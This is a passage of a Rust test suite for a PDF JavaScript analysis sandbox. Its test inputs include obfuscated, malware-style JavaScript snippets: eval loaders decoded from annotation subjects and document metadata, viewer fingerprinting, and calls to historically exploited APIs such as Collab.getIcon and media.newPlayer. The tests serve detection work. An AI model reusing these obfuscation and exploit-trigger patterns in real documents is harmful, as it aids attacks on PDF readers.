            assert!(signals.calls.iter().any(|c| c == "doc.syncAnnotScan"));
            assert!(signals.calls.iter().any(|c| c == "doc.getAnnots"));
            assert!(signals.calls.iter().any(|c| c == "alert"));
            assert!(signals.prop_reads.iter().any(|p| p == "app.doc"));
            assert!(signals.prop_reads.iter().any(|p| p == "annot.subject"));
            assert!(!signals
                .errors
                .iter()
                .any(|e| e.contains("cannot convert 'null' or 'undefined' to object")));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_app_plugins_eval_payloads() {
    let options = DynamicOptions::default();
    let payload = br#"var pr = null; var fnc = 'ev'; var sum = ''; app.doc.syncAnnotScan(); if (app.plugIns.length != 0) { var num = 1; pr = app.doc.getAnnots({ nPage: 0 }); sum = pr[num].subject; } var buf = ''; if (app.plugIns.length > 3) { fnc += 'a'; var arr = sum.split(/-/); for (var i = 1; i < arr.length; i++) { buf += String.fromCharCode('0x'+arr[i]); } fnc += 'l'; } if (app.plugIns.length >= 2) { app[fnc](buf); }"#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "doc.syncAnnotScan"));
            assert!(signals.calls.iter().any(|c| c == "doc.getAnnots"));
            assert!(signals.calls.iter().any(|c| c == "app.eval"));
            assert!(signals.prop_reads.iter().any(|p| p == "app.plugIns"));
            assert!(signals.prop_reads.iter().any(|p| p == "annot.subject"));
            assert!(!signals
                .errors
                .iter()
                .any(|e| e.contains("cannot convert 'null' or 'undefined' to object")));
            assert!(!signals.errors.iter().any(|e| e.contains("not a callable function")));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_event_target_unescape_payload() {
    let options = DynamicOptions::default();
    let payload = b"var th = event.target; th.syncAnnotScan(); var p = th.getAnnots({ nPage: 0 }); var s = p[0].subject; var l = s.replace(/z/g, 'a%b'.replace(/[ab]/g, '')); s = th['unescape'](l); var e = th['eval']; e(s);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "event.target.syncAnnotScan"));
            assert!(signals.calls.iter().any(|c| c == "event.target.getAnnots"));
            assert!(signals.calls.iter().any(|c| c == "event.target.unescape"));
            assert!(signals.calls.iter().any(|c| c == "event.target.eval"));
            assert!(!signals
                .errors
                .iter()
                .any(|e| e.contains("cannot convert 'null' or 'undefined' to object")));
            assert!(!signals.errors.iter().any(|e| e.contains("not a callable function")));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_viewer_version_collab_payload() {
    let options = DynamicOptions::default();
    let payload =
        b"var v = app.viewerVersion.toString(); v = v.replace(/\\D/g, ''); app.doc.Collab.getIcon('x');";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "Collab.getIcon"));
            assert!(signals.prop_reads.iter().any(|p| p == "app.doc"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_callable_app_properties() {
    let options = DynamicOptions::default();
    let payload = b"var v = app.viewerVersion(); var s = app.viewerVersion.toString(); var t = app.viewerType(); var l = app.plugIns.length;";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "app.viewerVersion"));
            assert!(signals.calls.iter().any(|c| c == "app.viewerType"));
            assert!(!signals.errors.iter().any(|e| e.contains("not a callable function")));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_adbe_reader_payload() {
    let options = DynamicOptions::default();
    let payload = br#"if (typeof(xfa_installed) == "undefined" || typeof(xfa_version) == "undefined" || xfa_version < 2.1) { if (app.viewerType == "Reader") { if (ADBE.Reader_Value_Asked != true) { if (app.viewerVersion < 6.0) { if (app.alert(ADBE.Viewer_Form_string_Reader_5x, 1, 1) == 1) this.getURL(ADBE.Reader_Value_New_Version_URL + ADBE.SYSINFO, false); ADBE.Reader_Value_Asked = true; } else if (app.viewerVersion < 7.0) { if (app.alert(ADBE.Viewer_Form_string_Reader_601, 1, 1) == 1) app.findComponent({cType:"App", cName:"Reader7", cDesc: ADBE.Viewer_string_Update_Reader_Desc}); ADBE.Reader_Value_Asked = true; } else { if (app.alert(ADBE.Viewer_Form_string_Reader_6_7x, 1, 1) == 1) app.findComponent({cType:"Plugin", cName:"XFA", cDesc: ADBE.Viewer_string_Update_Reader_Desc}); ADBE.Reader_Value_Asked = true; } } } }"#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "alert"));
            assert!(!signals.errors.iter().any(|e| e.contains("ADBE is not defined")));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_info_gkds_payload() {
    let options = DynamicOptions::default();
    let payload =
        b"m1=this.info.gkds; m2=m1.replace(/zzzzz/g, ''); m3=this.info.gggsd+'al'; app[m3](m2);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "app.eval"));
            assert!(!signals
                .errors
                .iter()
                .any(|e| e.contains("cannot convert 'null' or 'undefined' to object")));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_recovers_undefined_string_vars() {
    let options = DynamicOptions::default();
    let payload = b"var out = str.replace(/a/g, '');";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.errors.is_empty());
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_recovers_undefined_function_vars() {
    let options = DynamicOptions::default();
    let payload = b"var vvv = z(unescape(xxx)); eval(vvv);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.errors.is_empty());
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_recovers_invalid_unicode_escapes() {
    let options = DynamicOptions::default();
    let payload = br#"var s = "\uZZZZ";"#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.errors.is_empty());
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_page_word_helpers() {
    let options = DynamicOptions::default();
    let payload = b"var n = getPageNumWords(0); var w = getPageNthWord(0, 0, false);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "getPageNumWords"));
            assert!(signals.calls.iter().any(|c| c == "getPageNthWord"));
            assert!(signals.errors.is_empty());
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_creator_subject_payloads() {
    let options = DynamicOptions::default();
    let payload = b"var b = this.creator; eval(unescape(this.creator.replace(/z/igm,'%'))); eval(unescape(this.subject.replace(/Hueputol/g, String.fromCharCode(0x3*0xC+0x1)).replace(/Dalbaeb/g,'B')));";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "eval"));
            assert!(signals.calls.iter().any(|c| c == "alert"));
            assert!(!signals.errors.iter().any(|e| e.contains("Eval error")));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_media_run_guard() {
    let options = DynamicOptions::default();
    let payload = b"j = true; run(); this.media.newPlayer(null);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "run"));
            assert!(signals.calls.iter().any(|c| c == "media.newPlayer"));
            assert!(!signals.errors.iter().any(|e| e.contains("not a callable function")));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_supports_string_substr() {
    let options = DynamicOptions::default();
    let payload = br#""abc".substr(1);"#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "String.substr"));
            assert!(signals.errors.is_empty());
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_get_annot() {
    let options = DynamicOptions::default();
    let payload = b"var a = this.getAnnot(0, '0001-0004'); if (a) { a.subject; }";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "getAnnot"));
            assert!(signals.prop_reads.iter().any(|p| p == "annot.subject"));
            assert!(signals.errors.is_empty());
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(not(feature = "js-sandbox"))]
#[test]
fn sandbox_reports_unavailable_without_feature() {
    let options = DynamicOptions::default();
    let outcome = js_analysis::run_sandbox(b"alert(1)", &options);
    match outcome {
        DynamicOutcome::Skipped { reason, .. } => assert_eq!(reason, "sandbox_unavailable"),
        _ => panic!("expected skip"),
    }
}
